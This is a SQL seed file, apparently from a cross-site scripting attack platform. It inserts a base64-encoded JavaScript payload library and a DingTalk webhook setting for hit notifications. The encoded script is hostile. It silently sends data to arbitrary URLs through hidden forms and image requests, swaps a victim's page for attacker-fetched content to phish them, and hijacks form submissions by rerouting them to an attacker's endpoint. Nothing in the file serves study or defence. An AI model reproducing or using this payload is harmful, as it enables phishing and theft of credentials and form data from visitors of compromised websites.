INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('xss.js', '22', 'dmFyIHhzcyA9IGZ1bmN0aW9uKCkgewogICAgdmFyIHggPSB7CiAgICAgICAgJ25hbWUnOiAneHNzLmpzJywKICAgICAgICAndmVyc2lvbic6ICcwLjEnLAogICAgICAgICdhdXRob3InOiAnamFja21hc2EnCiAgICB9OwoKICAgIHgueCA9IGZ1bmN0aW9uKGlkKSB7CiAgICAgICAgcmV0dXJuIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKQogICAgfTsKCiAgICAvL+WuuemUmeWPluWAvAogICAgeC5lID0gZnVuY3Rpb24oXykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHJldHVybiBldmFsKCcoJyArIF8gKyAnKScpCiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICByZXR1cm4gJycKICAgICAgICB9CiAgICB9OwoKICAgIC8v5rWP6KeI5ZmoIAogICAgeC5pID0gewogICAgICAgIGk6ICEhc2VsZi5BY3RpdmVYT2JqZWN0LAogICAgICAgIGM6ICEhc2VsZi5jaHJvbWUsCiAgICAgICAgZjogc2VsZi5tb3pQYWludENvdW50ID4gLTEsCiAgICAgICAgbzogISFzZWxmLm9wZXJhLAogICAgICAgIHM6ICFzZWxmLmNocm9tZSAmJiAhIXNlbGYuV2ViS2l0UG9pbnQKICAgIH07CgogICAgLy9VQQogICAgeC51YSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CgogICAgLy/liKTmlq3mmK/lkKbkuLroi7nmnpzmiYvmjIHorr7lpIcKICAgIHguYXBwbGUgPSB4LnVhLm1hdGNoKC9pcChvbmV8YWR8b2QpL2kpICE9IG51bGw7CgogICAgLy/pmo/mnLrmlbAKICAgIHgucmRtID0gZnVuY3Rpb24oKSB7CiAgICAgICAgcmV0dXJuIH5+KE1hdGgucmFuZG9tKCkgKiAxMDAwMDApCiAgICB9OwoKICAgIC8vdXJs57yW56CBKFVURjgpCiAgICB4LmVjID0gZW5jb2RlVVJJQ29tcG9uZW50OwoKICAgIHguaHRtbCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdodG1sJylbMF07CgogICAgLyoKICAgICAqIOmUgOavgeS4gOS4quWFg+e0oAogICAgICovCiAgICB4LmtpbGwgPSBmdW5jdGlvbihlKSB7CiAgICAgICAgZS5wYXJlbnRFbGVtZW50LnJlbW92ZUNoaWxkKGUpOwogICAgfTsKCiAgICAvKgogICAgICrnu5Hlrprkuovku7YKICAgICAqLwogICAgeC5iaW5kID0gZnVuY3Rpb24oZSwgbmFtZSwgZm4pIHsKICAgICAgICBlLmFkZEV2ZW50TGlzdGVuZXIgPyBlLmFkZEV2ZW50TGlzdGVuZXIobmFtZSwgZm4sIGZhbHNlKSA6IGUuYXR0YWNoRXZlbnQoIm9uIiArIG5hbWUsIGZuKTsKICAgIH07CgogICAgLyoKICAgICAqIGRvbeWHhuWkh+WujOavleaXtuaJp+ihjOWHveaVsAogICAgICovCiAgICB4LnJlYWR5ID0gZnVuY3Rpb24oZm4pIHsKICAgICAgICBpZiAoIXguaS5pKSB7CiAgICAgICAgICAgIHguYmluZChkb2N1bWVudCwgJ0RPTUNvbnRlbnRMb2FkZWQnLCBmbik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdmFyIHMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5kb1Njcm9sbCgnbGVmdCcpOwogICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwocyk7CiAgICAgICAgICAgICAgICAgICAgZm4oKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICAgICAgICAgIH0sIDQpOwogICAgICAgIH0KICAgIH0KCiAgICAvKgogICAgICog5ZCM5rqQ5qOA5rWLCiAgICAgKi8KICAgIHgubyA9IGZ1bmN0aW9uKHVybCkgewogICAgICAgIHZhciBsaW5rID0geC5kb20oJzxhIGhyZWY9IicgKyBlbmNvZGVVUkkodXJsKSArICciPicsIDIpOwogICAgICAgIHJldHVybiBsaW5rLnByb3RvY29sICsgbGluay5ob3N0bmFtZSArICc6JyArIGxpbmsucG9ydCA9PSBsb2NhdGlvbi5wcm90b2NvbCArIGxvY2F0aW9uLmhvc3RuYW1lICsgJzonICsgbGluay5wb3J0OwogICAgfTsKCiAgICAvKgogICAgICogaHRtbCB0byBkb20KICAgICAqLwogICAgeC5kb20gPSBmdW5jdGlvbihodG1sLCBnY3NlYykgewogICAgICAgIHZhciB0bXAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICAgICAgdG1wLmlubmVySFRNTCA9IGh0bWw7CiAgICAgICAgdmFyIGUgPSB0bXAuY2hpbGRyZW5bMF07CiAgICAgICAgZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIHguaHRtbC5hcHBlbmRDaGlsZChlKTsKICAgICAgICBnY3NlYyA+PiAwID4gMCAmJiBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICB4LmtpbGwoZSk7CiAgICAgICAgfSwgZ2NzZWMgKiAxMDAwKTsKICAgICAgICByZXR1cm4gZTsKICAgIH07CgogICAgLyoKICAgICAqIGFqYXgKICAgICAqLwogICAgeC5hamF4ID0gZnVuY3Rpb24odXJsLCBwYXJhbXMsIGNhbGxiYWNrKSB7CiAgICAgICAgKHBhcmFtcyBpbnN0YW5jZW9mIEZ1bmN0aW9uKSAmJiAoY2FsbGJhY2sgPSBwYXJhbXMsIHBhcmFtcyA9IHZvaWQoMCkpOwogICAgICAgIHZhciBYSFIgPSAoIXgubyh1cmwpICYmIHdpbmRvdy5YRG9tYWluUmVxdWVzdCkgfHwKICAgICAgICAgICAgd2luZG93LlhNTEh0dHBSZXF1ZXN0IHx8CiAgICAgICAgICAgIChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgQWN0aXZlWE9iamVjdCgnTVNYTUwyLlhNTEhUVFAnKQogICAgICAgICAgICB9KTsKICAgICAgICB2YXIgeGhyID0gbmV3IFhIUigpOwogICAgICAgIHhoci5vcGVuKHBhcmFtcyA/ICdwb3N0JyA6ICdnZXQnLCB1cmwpOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdjb250ZW50LXR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJykKICAgICAgICB9IGNhdGNoIChlKSB7fQogICAgICAgIGNhbGxiYWNrICYmICh4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICh0aGlzLnJlYWR5U3RhdGUgPT0gNCAmJiAoKHRoaXMuc3RhdHVzID49IDIwMCAmJiB0aGlzLnN0YXR1cyA8PSAzMDApIHx8IHRoaXMuc3RhdHVzID09IDMwNCkpICYmIGNhbGxiYWNrLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgfSk7CiAgICAgICAgeGhyLnNlbmQocGFyYW1zKTsKICAgIH07CgogICAgLyoKICAgICAqIG5vIGFqYXgKICAgICAqLwogICAgeC5uYWpheCA9IGZ1bmN0aW9uKHVybCwgcGFyYW1zKSB7CiAgICAgICAgaWYgKHBhcmFtcykgewogICAgICAgICAgICB2YXIgZm9ybSA9IHguZG9tKCc8Zm9ybSBtZXRob2Q9cG9zdCBhY2NlcHQtY2hhcnNldD11dGYtOD4nKTsKICAgICAgICAgICAgZm9ybS5hY3Rpb24gPSB1cmw7CiAgICAgICAgICAgIGZvciAodmFyIG5hbWUgaW4gcGFyYW1zKSB7CiAgICAgICAgICAgICAgICB2YXIgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOwogICAgICAgICAgICAgICAgaW5wdXQubmFtZSA9IG5hbWU7CiAgICAgICAgICAgICAgICBpbnB1dC52YWx1ZSA9IHBhcmFtc1tuYW1lXTsKICAgICAgICAgICAgICAgIGZvcm0uYXBwZW5kQ2hpbGQoaW5wdXQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBpZnJhbWUgPSB4LmRvbSgnPGlmcmFtZSBuYW1lPV8nICsgeC5yZG0oKSArICdfPicsIDYpOwogICAgICAgICAgICBmb3JtLnRhcmdldCA9IGlmcmFtZS5uYW1lOwogICAgICAgICAgICBmb3JtLnN1Ym1pdCgpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IHVybCArICcmJyArIHgucmRtKCk7CiAgICAgICAgfQogICAgfTsKCiAgICAvKgogICAgICog6ZKT6bG8CiAgICAgKi8KICAgIHgucGhpc2ggPSBmdW5jdGlvbih1cmwpIHsKICAgICAgICB4LmFqYXgodXJsLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgZG9jdW1lbnQub3BlbigpOwogICAgICAgICAgICBkb2N1bWVudC53cml0ZSh0aGlzLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgIGRvY3VtZW50LmNsb3NlKCk7CiAgICAgICAgICAgIGhpc3RvcnkucmVwbGFjZVN0YXRlICYgeC5vKHVybCkgJiYgaGlzdG9yeS5yZXBsYWNlU3RhdGUoJycsICcnLCB1cmwpOwogICAgICAgIH0pCiAgICB9OwoKICAgIC8qCiAgICAgKiDooajljZXliqvmjIEKICAgICAqLwogICAgeC54Zm9ybSA9IGZ1bmN0aW9uKGZvcm0sIGFjdGlvbikgewogICAgICAgIGZvcm0ub2xkX2FjdGlvbiA9IGZvcm0uYWN0aW9uLCBmb3JtLm9sZF90YXJnZXQgPSBmb3JtLnRhcmdldCwgZm9ybS5hY3Rpb24gPSBhY3Rpb247CiAgICAgICAgdmFyIGlmcmFtZSA9IHguZG9tKCc8aWZyYW1lIG5hbWU9XycgKyB4LnJkbSgpICsgJ18+Jyk7CiAgICAgICAgZm9ybS50YXJnZXQgPSBpZnJhbWUubmFtZTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICB4LmJpbmQoaWZyYW1lLCAnbG9hZCcsIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgZm9ybS5hY3Rpb24gPSBmb3JtLm9sZF9hY3Rpb24sIGZvcm0udGFyZ2V0ID0gZm9ybS5vbGRfdGFyZ2V0LCBmb3JtLm9uc3VibWl0ID0gbnVsbCwgZm9ybS5zdWJtaXQoKTsKICAgICAgICAgICAgfSkKICAgICAgICB9LCAzMCk7CiAgICB9OwoKICAgIC8qCiAgICAgKiDlh73mlbDku6PnkIYKICAgICAqLwogICAgeC5wcm94eSA9IGZ1bmN0aW9uKGZuLCBiZWZvcmUsIGFmdGVyKSB7CiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKCkgewogICAgICAgICAgICBiZWZvcmUgJiYgYmVmb3JlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgICAgIHZhciByZXN1bHQgPSBmbi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICBhZnRlciAmJiBhZnRlci5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgIH0KICAgIH07CgogICAgcmV0dXJuIHg7Cn0oKTs=', 0);



INSERT INTO xss.dingconfig (webhook, isNotice, msgConfig) VALUES ('https://ip', 1, 0);